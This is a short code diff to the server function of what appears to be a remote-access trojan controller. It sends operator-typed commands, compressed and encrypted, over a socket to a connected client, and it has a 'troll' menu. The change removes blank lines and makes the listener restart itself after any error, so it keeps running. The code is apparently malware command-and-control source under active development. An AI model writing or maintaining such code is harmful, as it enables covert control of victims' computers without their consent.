@@ -122,7 +122,6 @@ def start_server(port):
             command = input("\n[Server] Enter command: ").strip()
             compressed_command = ZstdCompressor().compress(command.encode("utf-8"))
             encrypted_command = encrypt(compressed_command)
-
             if command.lower() == "exit":
                 client_socket.sendall(encrypted_command)
                 client_socket.close()
@@ -137,7 +136,6 @@ def start_server(port):
                 encrypted_command = encrypt(compressed_command)
             elif command.lower() == "troll":
                 encrypted_command = troll_menu(client_socket)
-
             client_socket.sendall(encrypted_command)
             encrypted_response = client_socket.recv(4096)
 
@@ -151,6 +149,7 @@ def start_server(port):
     except Exception as e:
         print(f"[!] Error: {e}")
         client_socket.close()
+        start_server(port)
 
 if __name__ == "__main__":
     parser = argparse.ArgumentParser()
